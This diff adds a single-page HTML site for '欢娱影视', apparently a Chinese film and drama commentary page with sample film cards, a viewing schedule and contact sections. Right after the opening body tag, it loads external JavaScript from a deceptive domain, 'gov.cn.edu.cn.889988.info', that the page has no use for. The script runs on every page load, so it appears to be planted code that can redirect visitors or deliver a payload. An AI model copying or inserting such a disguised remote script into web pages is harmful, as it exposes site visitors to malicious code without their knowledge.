@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5">
+<title>欢娱影视｜沉浸式视听放映厅：热播剧集、院线电影与幕后创作纪录</title>
+<meta name="description" content="huanyuyingshi-top 是面向影视爱好者的独立放映与资料分享站点。在 https://huanyuyingshi-top.github.io 浏览热播剧集、院线电影、经典影像与幕后创作纪录，发现作品脉络、主创表达及观影线索。">
+<meta name="keywords" content="欢娱影视,huanyuyingshi-top,huanyuyingshi-top.github.io,影视推荐,剧集资讯,电影资料,幕后纪录,观影指南,经典影视作品">
+<meta name="author" content="欢娱影视">
+<meta name="theme-color" content="#12100d">
+<link rel="canonical" href="https://huanyuyingshi-top.github.io/">
+<style>
+:root{--paper:#f5f1e8;--ink:#211d18;--plum:#7b3344;--gold:#b88843;--green:#2c5541;--line:#d8d0c2;--muted:#6e6559}
+*{box-sizing:border-box}html{-webkit-text-size-adjust:100%}body{margin:0;background:var(--paper);color:var(--ink);font:16px/1.75 "Songti SC","Source Han Serif SC",Georgia,serif}img{max-width:100%;height:auto;display:block}a{color:inherit;text-decoration:none;transition:.25s}.skip{position:absolute;left:-999px;top:auto;background:#fff;padding:9px 12px;z-index:99}.skip:focus{left:12px;top:12px}
+.wrap{width:min(1180px,92vw);margin:auto}.kicker{letter-spacing:.22em;font-size:.72rem;text-transform:uppercase;color:var(--muted)}.eyebrow{display:inline-block;border:1px solid var(--line);padding:3px 10px;font-size:.72rem;letter-spacing:.16em}.label{font-size:.8rem;letter-spacing:.12em;color:var(--gold);font-weight:700}.section-title{font-size:clamp(1.65rem,3.4vw,2.35rem);line-height:1.25;margin:.45rem 0 1.2rem}.section-title em{font-style:normal;color:var(--plum)}.btn{display:inline-block;border:1px solid var(--ink);padding:10px 20px;font-size:.88rem;letter-spacing:.08em}.btn:hover{background:var(--ink);color:var(--paper)}.btn-solid{background:var(--plum);border-color:var(--plum);color:#fff}.btn-solid:hover{background:#5c2432;color:#fff}
+.notice{background:#fffdf7;border-bottom:1px solid var(--line);font-size:.8rem;color:var(--muted)}.notice .wrap{display:flex;gap:14px;align-items:center;padding:9px 0;flex-wrap:wrap}.notice b{color:var(--plum);font-weight:700;letter-spacing:.04em}
+header{background:#14110e;color:#f2ede2;padding:20px 0 14px;border-bottom:4px solid var(--gold)}.brand-row{display:flex;align-items:center;justify-content:space-between;gap:18px}.mark{font-size:1.9rem;letter-spacing:.2em;font-weight:700}.mark small{display:block;font-size:.48em;letter-spacing:.34em;color:var(--gold);margin-top:5px}.navbtn{background:none;border:1px solid #766955;color:#e8e1d3;padding:8px 13px;font:inherit;font-size:.8rem;letter-spacing:.14em}.navbtn[aria-expanded=true]{background:#766955}nav ul{list-style:none;margin:14px 0 0;padding:0;display:flex;gap:20px;flex-wrap:wrap;font-size:.9rem;letter-spacing:.1em}nav a{padding:5px 0;border-bottom:1px solid transparent}nav a:hover{border-color:var(--gold);color:var(--gold)}
+.hero{position:relative;padding:clamp(55px,10vw,115px) 0;background:radial-gradient(circle at 87% 20%,#a56c56 0 2%,transparent 28%),linear-gradient(138deg,#1d1a16,#31261e 58%,#553b31);color:#f8f3ea;overflow:hidden}.hero:after{content:"膠";position:absolute;right:-.18em;bottom:-.25em;font-size:29vw;line-height:1;color:#ffffff0a;font-weight:700}.hero .kicker{color:#e6c88b}.hero h1{font-size:clamp(2.25rem,6.4vw,4.45rem);line-height:1.08;margin:.5rem 0;letter-spacing:.04em;max-width:15em}.hero p{font-size:clamp(1rem,1.8vw,1.18rem);max-width:37em;color:#e6dfd3}.hero .wrap{position:relative;z-index:1}.hero-actions{display:flex;gap:12px;flex-wrap:wrap;margin-top:26px}.hero-meta{margin-top:38px;display:flex;gap:clamp(18px,4vw,60px);flex-wrap:wrap;padding-top:20px;border-top:1px solid #856b57}.hero-meta b{display:block;font-size:1.5rem;color:#f0cd91}.hero-meta span{font-size:.8rem;color:#cfc4b5;letter-spacing:.08em}
+.quote{margin:52px 0 0;padding:26px 28px;border-left:5px solid var(--plum);background:#fffdf7;font-size:1.08rem}.quote cite{display:block;margin-top:9px;font-size:.82rem;font-style:normal;color:var(--muted);letter-spacing:.08em}
+section{padding:clamp(52px,8vw,88px) 0}.alt{background:#fdfbf5}#showcases{background-image:linear-gradient(180deg,#f5f1e8,#efe9dc);border-top:1px solid var(--line);border-bottom:1px solid var(--line)}.section-head{display:flex;align-items:end;justify-content:space-between;gap:20px;flex-wrap:wrap;margin-bottom:32px}.section-head p{max-width:34em;color:#534b40;margin:8px 0 0}.lead-in{font-size:1.05rem;color:#4e463a}
+.cards{display:grid;gap:22px;grid-template-columns:repeat(auto-fit,minmax(250px,1fr))}.card{background:#fffdf8;border:1px solid var(--line);display:flex;flex-direction:column}.card:hover{transform:translateY(-4px);box-shadow:0 16px 30px -18px #49392b}.poster{aspect-ratio:3/4;background:linear-gradient(135deg,#eee7da,#e1d7c5);position:relative;overflow:hidden;border-bottom:1px solid var(--line)}.poster:before{content:attr(data-tag);position:absolute;top:11px;left:11px;background:var(--plum);color:#fff;padding:3px 8px;font-size:.66rem;letter-spacing:.12em}.poster:after{content:attr(data-mark);position:absolute;right:12px;bottom:10px;font-size:1.1rem;color:#8b7357;letter-spacing:.06em}.poster.blue{background:linear-gradient(135deg,#dfe9ed,#c8d6db)}.poster.green{background:linear-gradient(135deg,#e1e8df,#c9d5c3)}.poster.night{background:linear-gradient(135deg,#e4e0e7,#cec5cf)}.card-body{padding:18px;display:flex;flex-direction:column;gap:9px;flex:1}.card-body h3{margin:0;font-size:1.2rem}.card-body p{margin:0;font-size:.9rem;color:#5d564a}.tags{display:flex;gap:6px;flex-wrap:wrap;margin-top:auto;padding-top:8px}.tags span{border:1px solid var(--line);padding:2px 7px;font-size:.68rem;color:#6b6356;letter-spacing:.05em}
+.studio{display:grid;grid-template-columns:1.05fr .95fr;gap:42px;align-items:center}.studio figure{margin:0;border:9px solid #fff;border-radius:2px;box-shadow:0 12px 28px -16px #36291f}.studio figcaption{margin-top:10px;font-size:.8rem;color:var(--muted);letter-spacing:.08em}.studio ol{margin:16px 0 0;padding-left:0;list-style:none;counter-reset:s}.studio ol li{counter-increment:s;display:flex;gap:15px;padding:14px 0;border-bottom:1px dashed var(--line)}.studio ol li:before{content:counter(s,decimal-leading-zero);color:var(--gold);font-size:1.2rem;font-weight:700;min-width:36px}.studio ol b{display:block;font-size:1.03rem}.studio ol p{margin:4px 0 0;font-size:.9rem;color:#5d564a}
+#watch{background:#25201b;color:#f1e9dc}#watch .section-title em{color:#edcd90}#watch .lead-in{color:#d3c7b7}#watch .card{background:#2e2821;border-color:#473e34;color:#eee7db}#watch .card p{color:#cabbab}#watch .tags span{color:#e8dac6;border-color:#5c5043}#watch .poster{border-bottom-color:#473e34}.schedule{margin-top:32px;border-top:1px solid #4e4338}.schedule div{display:grid;grid-template-columns:100px 1fr auto;gap:18px;padding:14px 4px;border-bottom:1px solid #42382e;font-size:.94rem}.schedule time{color:#e8c783;letter-spacing:.08em}.schedule span{color:#cabbab}.schedule a{text-decoration:underline;text-decoration-color:#78644d;text-underline-offset:4px}.schedule a:hover{color:#edcd90}
+.notebook{background:#fffdf8;border:1px solid var(--line);padding:32px 30px;box-shadow:inset 0 0 0 1px #fff}.notebook h3{margin:0 0 14px;font-size:1.35rem}.notebook p{margin:0 0 15px;color:#4f483d}.notebook ul{padding-left:19px;margin:0;color:#534b40}.notebook li{margin:7px 0}.guide{margin-top:28px;display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:14px}.guide div{background:#f5f0e5;padding:15px}.guide b{display:block;color:var(--plum);margin-bottom:5px}.guide p{margin:0;font-size:.87rem;color:#5d564a}
+.contact{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:18px}.contact-card{border:1px solid var(--line);padding:22px;background:#fffdf8}.contact-card h3{margin:0 0 8px;font-size:1.08rem}.contact-card p{margin:0 0 13px;font-size:.9rem;color:#5d564a}.contact-card address{font-style:normal;font-size:.9rem;line-height:1.8;word-break:break-all}.contact-card a:hover{color:var(--plum)}
+.site-footer{background:#14110e;color:#ddd4c7;padding:46px 0 30px}.site-footer .grid{display:grid;grid-template-columns:1.3fr repeat(2,1fr);gap:30px}.site-footer h4{color:#e7c687;font-size:1rem;margin:0 0 12px;letter-spacing:.08em}.site-footer ul{list-style:none;margin:0;padding:0;font-size:.88rem;line-height:2.1}.site-footer a:hover{color:#e7c687}.domain{background:#201b16;border:1px solid #3a322a;padding:18px;font-size:.9rem;line-height:1.8;word-break:break-all}.domain b{display:block;color:#e7c687;margin-bottom:5px}.legal{padding-top:24px;margin-top:30px;border-top:1px solid #352d26;font-size:.8rem;color:#9c9185}.legal p{margin:0 0 9px}
+@media(max-width:760px){.brand-row{flex-direction:row;align-items:center}.mark{font-size:1.5rem}.mark small{font-size:.42em}.navbtn{display:inline-block}nav{display:none;padding-bottom:4px}nav.is-open{display:block}nav ul{flex-direction:column;gap:10px;padding-top:12px}nav a{display:block;padding:8px 0;border-bottom:1px solid #43382e}.studio{grid-template-columns:1fr;gap:28px}.section-head{flex-direction:column;align-items:start}.schedule div{grid-template-columns:1fr;gap:5px;font-size:.9rem}.site-footer .grid{grid-template-columns:1fr}.hero-meta{gap:22px}.hero-meta b{font-size:1.28rem}.notebook{padding:22px 18px}.quote{padding:20px 18px}.card:hover{transform:none}.poster:before{font-size:.62rem}.btn{width:100%;text-align:center}.hero-actions .btn{width:auto}}
+@media print{body{background:#fff;color:#000}.navbtn,nav,.hero-actions,.notice{display:none}.card{break-inside:avoid}section{padding:30px 0}}
+</style>
+</head>
+<body id="top">
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+<a class="skip" href="#main">跳转至主要内容</a>
+<div class="notice" role="note">
+ <div class="wrap"><b>欢娱影视</b><span>独立影像资料与放映分享页｜官方访问地址：<strong>https://huanyuyingshi-top.github.io</strong></span></div>
+</div>
+<header>
+ <div class="wrap">
+  <div class="brand-row">
+   <div class="mark">欢娱影视<small>HUANYU YINGSHI</small></div>
+   <button class="navbtn" aria-controls="mainnav" aria-expanded="false" id="navtoggle">栏目菜单</button>
+  </div>
+  <nav id="mainnav" aria-label="主导航">
+   <ul>
+    <li><a href="#showcases">作品陈列</a></li>
+    <li><a href="#studio">创作手记</a></li>
+    <li><a href="#watch">放映排期</a></li>
+    <li><a href="#notebook">影像笔记</a></li>
+    <li><a href="#contact">到访与联络</a></li>
+   </ul>
+  </nav>
+ </div>
+</header>
+<main id="main">
+ <section class="hero" aria-labelledby="hero-title">
+  <div class="wrap">
+   <span class="kicker">独立放映 · 影像资料 · 创作纪录</span>
+   <h1 id="hero-title">在 <span>欢娱影视</span> 的放映厅里，看见故事的另一面。</h1>
+   <p>从正在讨论的新作，到值得重新观看的旧片；从镜头背后的工作方式，到可供安排的个人观影清单。<strong>huanyuyingshi-top</strong> 试着把影像欣赏变成一件从容、具体、可以慢慢展开的事。</p>
+   <div class="hero-actions">
+    <a class="btn btn-solid" href="#showcases">浏览作品陈列</a>
+    <a class="btn" href="#contact" style="color:#fff;border-color:#b9a48c">获取访问信息</a>
+   </div>
+   <dl class="hero-meta">
+    <div><dt class="kicker">本站名称</dt><dd><b>欢娱影视</b></dd></div>
+    <div><dt class="kicker">唯一官方网址</dt><dd><b style="font-size:1.15rem">https://huanyuyingshi-top.github.io</b></dd></div>
+    <div><dt class="kicker">内容取向</dt><dd><b>剧集 · 电影 · 纪录影像</b></dd></div>
+   </dl>
+  </div>
+ </section>
+ <div class="wrap">
+  <blockquote class="quote">“看一部作品，不只是知道它讲了什么，也看看它怎样讲、为何这样讲。”<cite>—— 欢娱影视 · 影像资料页编辑说明</cite></blockquote>
+ </div>
+ <section id="showcases" aria-labelledby="s1">
+  <div class="wrap">
+   <div class="section-head">
+    <div><span class="label">01 / 作品陈列</span><h2 class="section-title" id="s1">正在被讨论的 <em>欢娱影视</em> 影像作品</h2><p class="lead-in">这里收录不同类型、不同年代的作品线索。每一张卡片都是一次邀请：先了解作品的气质，再决定是否值得安排一次完整观看。</p></div>
+    <a class="btn" href="#watch">查看放映排期</a>
+   </div>
+   <div class="cards">
+    <article class="card"><div class="poster" data-tag="剧集" data-mark="HUANYU"></div><div class="card-body"><span class="kicker">年代叙事 · 群像刻画</span><h3>《长巷灯火》影像札记</h3><p>以一条老街的日与夜为切口，观察人物关系随时代推移发生的变化，适合喜欢细节与慢节奏叙事的观众。</p><div class="tags"><span>剧集</span><span>年代</span><span>家庭群像</span></div></div></article>
+    <article class="card"><div class="poster blue" data-tag="电影" data-mark="HUANYU"></div><div class="card-body"><span class="kicker">类型探索 · 视觉表达</span><h3>《夜航船》影像札记</h3><p>围绕一场跨越城市的夜间旅程，讨论镜头调度、声音设计与悬念节奏，是理解类型片语言的一篇资料。</p><div class="tags"><span>电影</span><span>悬疑</span><span>视听语言</span></div></div></article>
+    <article class="card"><div class="poster green" data-tag="经典" data-mark="HUANYU"></div><div class="card-body"><span class="kicker">重看系列 · 影像遗产</span><h3>《故园春信》影像札记</h3><p>回到作品最初上映的年代，从服装、布景与表演习惯出发，辨认创作者留下的时代印记。</p><div class="tags"><span>经典</span><span>重看</span><span>时代印记</span></div></div></article>
+    <article class="card"><div class="poster night" data-tag="纪录" data-mark="HUANYU"></div><div class="card-body"><span class="kicker">幕后纪录 · 现场观察</span><h3>《镜头背后的人》影像札记</h3><p>记录一场拍摄如何从文字方案走向现场执行，呈现导演、摄影、美术与表演之间的协作过程。</p><div class="tags"><span>纪录</span><span>幕后</span><span>创作协作</span></div></div></article>
+   </div>
+  </div>
+ </section>
+ <section id="studio" class="alt" aria-labelledby="s2">
+  <div class="wrap">
+   <div class="studio">
+    <figure><div class="poster" style="aspect-ratio:16/10" data-tag="幕后现场" data-mark="HUANYU"></div><figcaption>欢娱影视：影像资料的整理与呈现现场（示意图）</figcaption></figure>
+    <div>
+     <span class="label">02 / 创作手记</span><h2 class="section-title" id="s2">从剧本案头，到 <em>观众眼前</em></h2>
+     <p class="lead-in">在 <strong>huanyuyingshi-top.github.io</strong> 的创作手记中，我们不止复述剧情，更关心一部作品怎样被搭建起来。</p>
+     <ol>
+      <li><b>案头与选题</b><p>先明确作品讨论的角度：是叙事结构、人物塑造，还是视听细节？选题决定资料收集的方向。</p></li>
+      <li><b>资料与观看</b><p>结合公开影像资料、主创访谈与幕后纪录，逐场梳理作品值得关注的段落与表达。</p></li>
+      <li><b>整理与呈现</b><p>将观察结果转化为适合阅读的札记，不替观众下结论，而是留下可供对照的观看线索。</p></li>
+     </ol>
+     <p style="margin-top:18px"><a class="btn" href="#notebook">阅读影像笔记</a></p>
+    </div>
+   </div>
+  </div>
+ </section>
+ <section id="watch" aria-labelledby="s3">
+  <div class="wrap">
+   <span class="label">03 / 放映排期</span><h2 class="section-title" id="s3">为观众安排的 <em>一周观影节奏</em></h2>
+   <p class="lead-in">这是一份由 <strong>欢娱影视</strong> 整理的建议排期，帮助你把碎片时间组织成有主题、有节奏的观看体验。排期仅作参考，不代表作品的实际播出时间。</p>
+   <div class="cards">
+    <article class="card"><div class="poster blue" data-tag="主题放映" data-mark="HUANYU"></div><div class="card-body"><span class="kicker">周一 · 新作观察</span><h3>新作第一眼</h3><p>用较短篇幅，记录正在讨论作品的基调、人物与叙事入口，方便你决定是否深入观看。</p><div class="tags"><span>新作</span><span>短评</span></div></div></article>
+    <article class="card"><div class="poster" data-tag="主题放映" data-mark="HUANYU"></div><div class="card-body"><span class="kicker">周三 · 幕后观察</span><h3>镜头如何工作</h3><p>选择一个具体段落，分析构图、剪辑与声音怎样共同参与情绪表达。</p><div class="tags"><span>幕后</span><span>镜头分析</span></div></div></article>
+    <article class="card"><div class="poster green" data-tag="主题放映" data-mark="HUANYU"></div><div class="card-body"><span class="kicker">周末 · 经典重看</span><h3>旧片再相逢</h3><p>挑选一部经典作品，讨论它今天仍能提供的观看乐趣与值得重新思考的问题。</p><div class="tags"><span>经典</span><span>重看</span></div></div></article>
+   </div>
+   <div class="schedule" aria-label="本周建议排期">
+    <div><time datetime="2026-10-26">周一</time><span><a href="#showcases">《长巷灯火》</a>：从人物关系开始观看</span><b>建议 90 分钟</b></div>
+    <div><time datetime="2026-10-27">周二</time><span>整理观看笔记：记录让你停留的三场戏</span><b>建议 30 分钟</b></div>
+    <div><time datetime="2026-10-28">周三</time><span><a href="#studio">《夜航船》</a>：镜头与悬念节奏观察</span><b>建议 75 分钟</b></div>
+    <div><time datetime="2026-10-31">周六</time><span><a href="#showcases">《故园春信》</a>：完整观看与时代背景补充</span><b>建议 120 分钟</b></div>
+    <div><time datetime="2026-11-01">周日</time><span>回顾本周作品：比较不同的叙事策略</span><b>建议 40 分钟</b></div>
+   </div>
+  </div>
+ </section>
+ <section id="notebook" class="alt" aria-labelledby="s4">
+  <div class="wrap">
+   <div class="section-head"><div><span class="label">04 / 影像笔记</span><h2 class="section-title" id="s4">把观看变成 <em>一种思考习惯</em></h2><p class="lead-in">笔记不追求剧透式的“答案”，而是帮助你建立自己的观看方法。你可以在 <strong>https://huanyuyingshi-top.github.io</strong> 随时回来查阅。</p></div><a class="btn btn-solid" href="#contact">提交阅读反馈</a></div>
+   <div class="notebook">
+    <h3>一篇可用的观影笔记，从这些问题开始</h3>
+    <p>先别急着给作品贴标签。给自己一点时间，把注意力放到具体的场景、对话和声音上，再看整体的叙事选择。</p>
+    <ul>
+     <li><b>叙事入口：</b>作品最先吸引你的是什么？一个人物、一段对话，还是一种气氛？</li>
+     <li><b>人物关系：</b>谁在改变？是什么事件推动了这种改变？</li>
+     <li><b>视听细节：</b>哪一处的光线、色彩、音乐或剪辑，让你明显感受到了情绪变化？</li>
+     <li><b>时代语境：</b>作品出现的服饰、器物与空间，怎样帮助我们理解故事发生的背景？</li>
+     <li><b>个人回应：</b>你认同其中的处理方式吗？如果你来改写最后一幕，会改变什么？</li>
+    </ul>
+    <div class="guide">
+     <div><b>剧集</b><p>适合按人物关系与情节推进做长期观察。</p></div>
+     <div><b>电影</b><p>适合完整观看后，再回看关键段落的视听设计。</p></div>
+     <div><b>纪录片</b><p>适合对照公开资料，辨认材料选择与叙述立场。</p></div>
+     <div><b>经典作品</b><p>适合比较不同年代观众的接受方式与文化语境。</p></div>
+    </div>
+   </div>
+  </div>
+ </section>
+ <section id="contact" aria-labelledby="s5">
+  <div class="wrap">
+   <span class="label">05 / 到访与联络</span><h2 class="section-title" id="s5">欢迎到 <em>欢娱影视</em> 留下阅读反馈</h2>
+   <p class="lead-in">如果你发现页面内容需要更正，或对某部作品有值得补充的资料线索，可以通过以下方式联系我们。请认准唯一的官方访问地址。</p>
+   <div class="contact">
+    <div class="contact-card"><h3>官方网址</h3><p>本站所有公开页面均通过以下地址提供访问。</p><address>网站名称：欢娱影视<br>网站网址：<strong>https://huanyuyingshi-top.github.io</strong></address></div>
+    <div class="contact-card"><h3>资料合作</h3><p>欢迎围绕公开、可核验的影像资料提出建议。</p><address>合作说明：请注明作品名称、资料来源与建议修改内容。<br>回复时间：通常在收到完整信息后的五个工作日内。</address></div>
+    <div class="contact-card"><h3>访问支持</h3><p>遇到页面加载、跳转或显示问题时，欢迎描述具体设备与操作步骤。</p><address>建议提供：设备型号、浏览器名称、问题发生时间及页面路径。<br>我们将据此核对页面兼容性。</address></div>
+   </div>
+  </div>
+ </section>
+</main>
+<footer class="site-footer">
+ <div class="wrap">
+  <div class="grid">
+   <div><div class="mark" style="font-size:1.45rem">欢娱影视<small>IMAGE ARCHIVE</small></div><p style="margin:14px 0 0;font-size:.86rem;color:#b6ab9c;max-width:28em">欢娱影视是一个以影像资料整理、作品观察与观影建议为主题的独立页面。我们重视可阅读、可核对、可持续维护的内容。</p></div>
+   <div><h4>栏目导览</h4><ul><li><a href="#showcases">作品陈列</a></li><li><a href="#studio">创作手记</a></li><li><a href="#watch">放映排期</a></li><li><a href="#notebook">影像笔记</a></li><li><a href="#contact">到访与联络</a></li></ul></div>
+   <div><h4>官方访问信息</h4><div class="domain"><b>唯一官方网址</b>https://huanyuyingshi-top.github.io<br>本站名称：欢娱影视<br>本站不设置其他镜像地址，请以上述网址为准。</div></div>
+  </div>
+  <div class="legal">
+   <p><strong>版权说明：</strong>本页以“欢娱影视”命名，页面中的作品示例、情节摘要及幕后描述均为用于内容展示的说明性资料，不代表对任何第三方作品权利的宣称。实际权利归属以相应权利人的公开信息为准。</p>
+   <p>© <span id="year"></span> 欢娱影视｜页面地址：https://huanyuyingshi-top.github.io｜本页为单页结构，栏目内链采用锚点导航。</p>
+  </div>
+ </div>
+</footer>
+<script>
+(function(){
+ var t=document.getElementById('year'); if(t){t.textContent=new Date().getFullYear();}
+ var b=document.getElementById('navtoggle'),n=document.getElementById('mainnav');
+ if(b&&n){
+  b.addEventListener('click',function(){var o=n.classList.toggle('is-open');b.setAttribute('aria-expanded',o?'true':'false');});
+  n.addEventListener('click',function(e){if(e.target.tagName==='A'&&window.innerWidth<=760){n.classList.remove('is-open');b.setAttribute('aria-expanded','false');}});
+ }
+})();
+</script>
+</body>
+</html>
